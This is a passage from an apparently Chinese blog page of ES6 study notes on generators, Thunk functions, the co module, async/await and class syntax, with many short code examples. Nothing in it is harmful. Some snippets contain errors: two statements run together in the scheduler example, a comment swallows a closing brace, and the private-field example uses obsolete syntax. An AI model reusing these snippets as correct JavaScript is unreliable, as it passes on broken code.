id="Generator-prototype-throw"><a href="#Generator-prototype-throw" class="headerlink" title="Generator.prototype.throw()"></a>Generator.prototype.throw()</h3><ul><li>Generator 函数返回的遍历器对象，都有一个 throw 方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。</li><li>Generator 函数体内抛出的错误，也可以被函数体外的 catch 捕获。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var g = function* () &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    yield; </span><br><span class="line">  &#125; catch (e) &#123; </span><br><span class="line">    console.log(&apos;内部捕获&apos;, e); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;;</span><br><span class="line">var i = g(); </span><br><span class="line">i.next(); </span><br><span class="line">try &#123; </span><br><span class="line">  i.throw(&apos;a&apos;); </span><br><span class="line">  i.throw(&apos;b&apos;); </span><br><span class="line">&#125; catch (e) &#123; </span><br><span class="line">  console.log(&apos;外部捕获&apos;, e); </span><br><span class="line">&#125;</span><br><span class="line">// 内部捕获 a </span><br><span class="line">// 外部捕获 b</span><br></pre></td></tr></table></figure><h3 id="Generator-prototype-return"><a href="#Generator-prototype-return" class="headerlink" title="Generator.prototype.return()"></a>Generator.prototype.return()</h3><p>Generator 函数返回的遍历器对象，还有一个 return 方法，可以返回给定的值，并且终结遍历 Generator 函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function* gen() &#123; </span><br><span class="line">  yield 1; </span><br><span class="line">  yield 2; </span><br><span class="line">  yield 3; </span><br><span class="line">&#125;</span><br><span class="line">var g = gen(); </span><br><span class="line">g.next() // &#123; value: 1, done: false &#125; </span><br><span class="line">g.return(&apos;foo&apos;) // &#123; value: &quot;foo&quot;, done: true &#125; </span><br><span class="line">g.next() // &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure></p><h3 id="yield-表达式-1"><a href="#yield-表达式-1" class="headerlink" title="yield* 表达式"></a>yield* 表达式</h3><ul><li>用来在一个 Generator 函数里面执行另一个Generator 函数。</li><li>yield* 命令可以很方便地取出嵌套数组的所有成员。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function* foo() &#123; </span><br><span class="line">  yield &apos;a&apos;; </span><br><span class="line">  yield &apos;b&apos;; </span><br><span class="line">&#125;</span><br><span class="line">function* bar() &#123; </span><br><span class="line">  yield &apos;x&apos;; </span><br><span class="line">  yield* foo(); </span><br><span class="line">  yield &apos;y&apos;; </span><br><span class="line">&#125;</span><br><span class="line">// &quot;x&quot; </span><br><span class="line">// &quot;a&quot; </span><br><span class="line">// &quot;b&quot; </span><br><span class="line">// &quot;y&quot;</span><br></pre></td></tr></table></figure><h3 id="Generator-函数的-this"><a href="#Generator-函数的-this" class="headerlink" title="Generator 函数的 this"></a>Generator 函数的 this</h3><p>Generator 函数总是返回一个遍历器，ES6 规定这个遍历器是 Generator 函数的实例，也继承了 Generator 函数的 prototype 对象上的方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function* g() &#123;&#125; </span><br><span class="line">g.prototype.hello = function () &#123; </span><br><span class="line">  return &apos;hi!&apos;; </span><br><span class="line">&#125;;</span><br><span class="line">let obj = g(); </span><br><span class="line">obj instanceof g // true </span><br><span class="line">obj.hello() // &apos;hi!&apos;</span><br></pre></td></tr></table></figure></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="Generator-与状态机"><a href="#Generator-与状态机" class="headerlink" title="Generator 与状态机"></a>Generator 与状态机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//ES5</span><br><span class="line">var ticking = true; </span><br><span class="line">var clock = function() &#123; </span><br><span class="line">  if (ticking) </span><br><span class="line">    console.log(&apos;Tick!&apos;); </span><br><span class="line">  else</span><br><span class="line">    console.log(&apos;Tock!&apos;); </span><br><span class="line">  ticking = !ticking;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//ES6</span><br><span class="line">var clock = function* () &#123; </span><br><span class="line">  while (true) &#123; </span><br><span class="line">    console.log(&apos;Tick!&apos;); </span><br><span class="line">    yield; </span><br><span class="line">    console.log(&apos;Tock!&apos;); </span><br><span class="line">    yield; </span><br><span class="line">  &#125; &#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="异步操作的同步化表达"><a href="#异步操作的同步化表达" class="headerlink" title="异步操作的同步化表达"></a>异步操作的同步化表达</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function* main() &#123; </span><br><span class="line">  var result = yield request(&quot;http://some.url&quot;); </span><br><span class="line">  var resp = JSON.parse(result); </span><br><span class="line">  console.log(resp.value); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function request(url) &#123; </span><br><span class="line">  makeAjaxCall(url, function(response)&#123; </span><br><span class="line">    it.next(response); </span><br><span class="line">  &#125;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var it = main(); </span><br><span class="line">it.next();</span><br></pre></td></tr></table></figure><h4 id="控制流管理"><a href="#控制流管理" class="headerlink" title="控制流管理"></a>控制流管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function* longRunningTask(value1) &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    var value2 = yield step1(value1); </span><br><span class="line">    var value3 = yield step2(value2); </span><br><span class="line">    var value4 = yield step3(value3); </span><br><span class="line">    var value5 = yield step4(value4); </span><br><span class="line">    // Do something with value4 </span><br><span class="line">  &#125; catch (e) &#123; </span><br><span class="line">    // Handle any error from step1 through step4 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scheduler(longRunningTask(initialValue)); </span><br><span class="line">function scheduler(task) &#123; </span><br><span class="line">  var taskObj = task.next(task.value); </span><br><span class="line">  // 如果Generator函数未结束，就继续调用 </span><br><span class="line">  if (!taskObj.done) &#123; </span><br><span class="line">    task.value = taskObj.value scheduler(task); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="部署-Iterator-接口"><a href="#部署-Iterator-接口" class="headerlink" title="部署 Iterator 接口"></a>部署 Iterator 接口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function* makeSimpleGenerator(array)&#123; </span><br><span class="line">  var nextIndex = 0; </span><br><span class="line">  while(nextIndex &lt; array.length)&#123; </span><br><span class="line">    yield array[nextIndex++]; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var gen = makeSimpleGenerator([&apos;yo&apos;, &apos;ya&apos;]); </span><br><span class="line">gen.next().value // &apos;yo&apos; </span><br><span class="line">gen.next().value // &apos;ya&apos; </span><br><span class="line">gen.next().done // true</span><br></pre></td></tr></table></figure><h4 id="作为数据结构"><a href="#作为数据结构" class="headerlink" title="作为数据结构"></a>作为数据结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function *doStuff() &#123; </span><br><span class="line">  yield fs.readFile.bind(null, &apos;hello.txt&apos;); </span><br><span class="line">  yield fs.readFile.bind(null, &apos;world.txt&apos;); </span><br><span class="line">  yield fs.readFile.bind(null, &apos;and-such.txt&apos;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (task of doStuff()) &#123; </span><br><span class="line">  // task是一个函数，可以像回调函数那样使用它 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Generator函数的异步应用"><a href="#Generator函数的异步应用" class="headerlink" title="Generator函数的异步应用"></a>Generator函数的异步应用</h2><h3 id="Thunk-函数"><a href="#Thunk-函数" class="headerlink" title="Thunk 函数"></a>Thunk 函数</h3><p>编译器的“传名调用”实现，往往是将参数放到一个临时函数之中，再将这个临时函数传入函数体。这个临时函数就叫做 Thunk 函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function f(m) &#123; </span><br><span class="line">  return m * 2; </span><br><span class="line">&#125;</span><br><span class="line">f(x + 5); </span><br><span class="line">// 等同于 </span><br><span class="line">var thunk = function () &#123; </span><br><span class="line">  return x + 5; </span><br><span class="line">&#125;;</span><br><span class="line">function f(thunk) &#123; </span><br><span class="line">  return thunk() * 2; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="JavaScript-语言的-Thunk-函数"><a href="#JavaScript-语言的-Thunk-函数" class="headerlink" title="JavaScript 语言的 Thunk 函数"></a>JavaScript 语言的 Thunk 函数</h3><p>在 JavaScript 语言 中，Thunk 函数替换的不是表达式，而是多参数函数，将其替换成一个只接受回调函数作为参数的单参数函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 正常版本的readFile（多参数版本） </span><br><span class="line">fs.readFile(fileName, callback); </span><br><span class="line"></span><br><span class="line">// Thunk版本的readFile（单参数版本） </span><br><span class="line">var Thunk = function (fileName) &#123; </span><br><span class="line">  return function (callback) &#123; </span><br><span class="line">    return fs.readFile(fileName, callback); </span><br><span class="line">  &#125;; </span><br><span class="line">&#125;;</span><br><span class="line">var readFileThunk = Thunk(fileName); </span><br><span class="line">readFileThunk(callback);</span><br></pre></td></tr></table></figure></p><h3 id="Thunkify-模块"><a href="#Thunkify-模块" class="headerlink" title="Thunkify 模块"></a>Thunkify 模块</h3><p>确保回调函数只运行一次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function f(a, b, callback)&#123; </span><br><span class="line">  var sum = a + b; </span><br><span class="line">  callback(sum); </span><br><span class="line">  callback(sum); </span><br><span class="line">&#125;</span><br><span class="line">var ft = thunkify(f); </span><br><span class="line">var print = console.log.bind(console); </span><br><span class="line">ft(1, 2)(print); </span><br><span class="line">// 3</span><br></pre></td></tr></table></figure></p><h3 id="Generator函数的流程管理"><a href="#Generator函数的流程管理" class="headerlink" title="Generator函数的流程管理"></a>Generator函数的流程管理</h3><p>Thunk 函数真正的威力，在于可以自动执行 Generator 函数。下面就是一个基于 Thunk 函数的 Generator 执行器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function run(fn) &#123; </span><br><span class="line">  var gen = fn(); </span><br><span class="line">  function next(err, data) &#123; </span><br><span class="line">    var result = gen.next(data); </span><br><span class="line">    if (result.done) return; </span><br><span class="line">    result.value(next); </span><br><span class="line">  &#125;</span><br><span class="line">  next(); </span><br><span class="line">&#125;</span><br><span class="line">function* g() &#123; </span><br><span class="line">  // ... </span><br><span class="line">&#125;</span><br><span class="line">run(g);</span><br></pre></td></tr></table></figure></p><h3 id="co-模块"><a href="#co-模块" class="headerlink" title="co 模块"></a>co 模块</h3><p>co 模块可以让你不用编写 Generator 函数的执行器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var gen = function* () &#123; </span><br><span class="line">  var f1 = yield readFile(&apos;/etc/fstab&apos;); </span><br><span class="line">  var f2 = yield readFile(&apos;/etc/shells&apos;); </span><br><span class="line">  console.log(f1.toString()); </span><br><span class="line">  console.log(f2.toString()); </span><br><span class="line">&#125;;</span><br><span class="line">var co = require(&apos;co&apos;); </span><br><span class="line">co(gen);</span><br></pre></td></tr></table></figure></p><h2 id="async函数"><a href="#async函数" class="headerlink" title="async函数"></a>async函数</h2><h3 id="含义-1"><a href="#含义-1" class="headerlink" title="含义"></a>含义</h3><p>它就是 Generator 函数的语法糖。async 函数对 Generator 函数的改进，体现在以下四点。</p><ul><li>内置执行器。</li><li>更好的语义。</li><li>更广的适用性。</li><li>返回值是 Promise。</li></ul><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>当函数执行的时候，一旦遇到 await 就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">async function getStockPriceByName(name) &#123; </span><br><span class="line">  var symbol = await getStockSymbol(name); </span><br><span class="line">  var stockPrice = await getStockPrice(symbol); </span><br><span class="line">  return stockPrice; </span><br><span class="line">&#125;</span><br><span class="line">getStockPriceByName(&apos;goog&apos;).then(function (result) &#123; </span><br><span class="line">  console.log(result); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>async 函数内部抛出错误，会导致返回的 Promise 对象变为 reject 状态。抛出的错误对象会被 catch 方法回调函数接收到。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">async function f() &#123; </span><br><span class="line">  throw new Error(&apos;出错了&apos;); </span><br><span class="line">&#125;</span><br><span class="line">f().then( </span><br><span class="line">  v =&gt; console.log(v), </span><br><span class="line">  e =&gt; console.log(e) </span><br><span class="line">)</span><br><span class="line">// Error: 出错了</span><br></pre></td></tr></table></figure></p><h3 id="Promise-对象的状态变化"><a href="#Promise-对象的状态变化" class="headerlink" title="Promise 对象的状态变化"></a>Promise 对象的状态变化</h3><p>async 函数返回的 Promise 对象，必须等到内部所有 await 命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到 return 语句或者抛出错误。</p><h3 id="await-命令"><a href="#await-命令" class="headerlink" title="await 命令"></a>await 命令</h3><p>正常情况下， await 命令后面是一个 Promise 对象。如果不是，会被转成一个即 resolve 的 Promise 对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">async function f() &#123; </span><br><span class="line">  return await 123; </span><br><span class="line">&#125;</span><br><span class="line">f().then(v =&gt; console.log(v)) </span><br><span class="line">// 123</span><br></pre></td></tr></table></figure></p><p>只要一个 await 语句后面的 Promise 变为 reject ，那么整个 async 函数都会中断执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">async function f() &#123; </span><br><span class="line">  await Promise.reject(&apos;出错了&apos;); </span><br><span class="line">  await Promise.resolve(&apos;hello world&apos;); // 不会执行 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><ul><li>最好将 await 放在 try…catch 代码块之中。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">async function myFunction() &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    await somethingThatReturnsAPromise(); </span><br><span class="line">  &#125; catch (err) &#123; </span><br><span class="line">    console.log(err);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>多个 await 命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let [foo, bar] = await Promise.all([getFoo(), getBar()]);</span><br></pre></td></tr></table></figure><ul><li>await 命令只能用在 async 函数之中，如果用在普通函数，就会报错。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">async function dbFuc(db) &#123; </span><br><span class="line">  let docs = [&#123;&#125;, &#123;&#125;, &#123;&#125;]; </span><br><span class="line">  // 报错 </span><br><span class="line">  docs.forEach(function (doc) &#123; </span><br><span class="line">    await db.post(doc); </span><br><span class="line">  &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异步遍历器"><a href="#异步遍历器" class="headerlink" title="异步遍历器"></a>异步遍历器</h3><h4 id="for-await…of"><a href="#for-await…of" class="headerlink" title="for await…of"></a>for await…of</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">async function () &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    for await (const x of createRejectingIterable()) &#123; </span><br><span class="line">      console.log(x); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; catch (e) &#123; </span><br><span class="line">    console.error(e); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Class-的基本语法"><a href="#Class-的基本语法" class="headerlink" title="Class 的基本语法"></a>Class 的基本语法</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//定义类 </span><br><span class="line">class Point &#123; </span><br><span class="line">  constructor(x, y) &#123; </span><br><span class="line">    this.x = x; </span><br><span class="line">    this.y = y; </span><br><span class="line">  &#125;</span><br><span class="line">  toString() &#123; </span><br><span class="line">    return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类的所有方法都定义在类的 prototype 属性上面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 等同于 </span><br><span class="line">Point.prototype = &#123; </span><br><span class="line">  constructor() &#123;&#125;, </span><br><span class="line">  toString() &#123;&#125;, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>Object.assign 方法可以很方便地一次向类添加多个方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object.assign(Point.prototype, &#123; </span><br><span class="line">  toString()&#123;&#125;, </span><br><span class="line">  toValue()&#123;&#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>类的内部所有定义的方法，都是不可枚举的。</p><h3 id="constructor-方法"><a href="#constructor-方法" class="headerlink" title="constructor 方法"></a>constructor 方法</h3><p>constructor 方法是类的默认方法，通过 new 命令生成对象实例时，自动调用该方法。一个类必须有 constructor 方法，如果没有显式定义，一个空的 constructor 方法会被默认添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; &#125;</span><br><span class="line">// 等同于 </span><br><span class="line">class Point &#123; </span><br><span class="line">  constructor() &#123;&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="类的实例对象"><a href="#类的实例对象" class="headerlink" title="类的实例对象"></a>类的实例对象</h3><ul><li>生成类的实例对象的写法，与 ES5 完全一样，也是使用 new 命令。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; // ... &#125;</span><br><span class="line">// 报错 </span><br><span class="line">var point = Point(2, 3); </span><br><span class="line">// 正确 </span><br><span class="line">var point = new Point(2, 3);</span><br></pre></td></tr></table></figure><ul><li>与 ES5 一样，实例的属性除非显式定义在其本身（即定义在 this 对象上），否则都是定义在原型上（即定义在 class 上）。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//定义类 </span><br><span class="line">class Point &#123; </span><br><span class="line">  constructor(x, y) &#123; </span><br><span class="line">    this.x = x; </span><br><span class="line">    this.y = y; </span><br><span class="line">  &#125;</span><br><span class="line">  toString() &#123; </span><br><span class="line">    return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var point = new Point(2, 3); </span><br><span class="line">point.toString() // (2, 3) </span><br><span class="line">point.hasOwnProperty(&apos;x&apos;) // true </span><br><span class="line">point.hasOwnProperty(&apos;y&apos;) // true </span><br><span class="line">point.hasOwnProperty(&apos;toString&apos;) // false </span><br><span class="line">point.__proto__.hasOwnProperty(&apos;toString&apos;) // true</span><br></pre></td></tr></table></figure><ul><li>与 ES5 一样，类的所有实例共享一个原型对象。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var p1 = new Point(2,3); </span><br><span class="line">var p2 = new Point(3,2); </span><br><span class="line">p1.__proto__ === p2.__proto__ </span><br><span class="line">//true</span><br></pre></td></tr></table></figure><h3 id="Class-表达式"><a href="#Class-表达式" class="headerlink" title="Class 表达式"></a>Class 表达式</h3><ul><li>与函数一样，类也可以使用表达式的形式定义。</li><li>采用 Class 表达式，可以写出立即执行的 Class。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let person = new class &#123; </span><br><span class="line">  constructor(name) &#123; </span><br><span class="line">    this.name = name; </span><br><span class="line">  &#125;</span><br><span class="line">  sayName() &#123; </span><br><span class="line">    console.log(this.name); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;(&apos;张三&apos;); </span><br><span class="line">person.sayName(); // &quot;张三&quot;</span><br></pre></td></tr></table></figure><h3 id="不存在变量提升"><a href="#不存在变量提升" class="headerlink" title="不存在变量提升"></a>不存在变量提升</h3><p>类不存在变量提升（hoist），这一点与 ES5 完全不同。</p><h3 id="私有方法"><a href="#私有方法" class="headerlink" title="私有方法"></a>私有方法</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>将私有方法移出模块,内部调用 call 进行绑定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Widget &#123; </span><br><span class="line">  foo (baz) &#123; </span><br><span class="line">    bar.call(this, baz); </span><br><span class="line">  &#125;</span><br><span class="line">  // ... </span><br><span class="line">&#125;</span><br><span class="line">function bar(baz) &#123; </span><br><span class="line">  return this.snaf = baz; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>利用 Symbol 值的唯一性，将私有方法的名字命名为一个 Symbol 值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const bar = Symbol(&apos;bar&apos;); </span><br><span class="line">const snaf = Symbol(&apos;snaf&apos;); </span><br><span class="line">export default class myClass&#123; </span><br><span class="line">  // 公有方法 </span><br><span class="line">  foo(baz) &#123; </span><br><span class="line">    this[bar](baz); </span><br><span class="line">  &#125;</span><br><span class="line">  // 私有方法 </span><br><span class="line">  [bar](baz) &#123; </span><br><span class="line">    return this[snaf] = baz; </span><br><span class="line">  &#125;</span><br><span class="line">  // ... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h3><p>在属性名之前，使用 # 表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; </span><br><span class="line">  #x; </span><br><span class="line">  constructor(x = 0) &#123; </span><br><span class="line">    #x = +x; </span><br><span class="line">    // 写成 this.#x 亦可 </span><br><span class="line">  &#125;</span><br><span class="line">  get x() &#123; </span><br><span class="line">    return #x </span><br><span class="line">  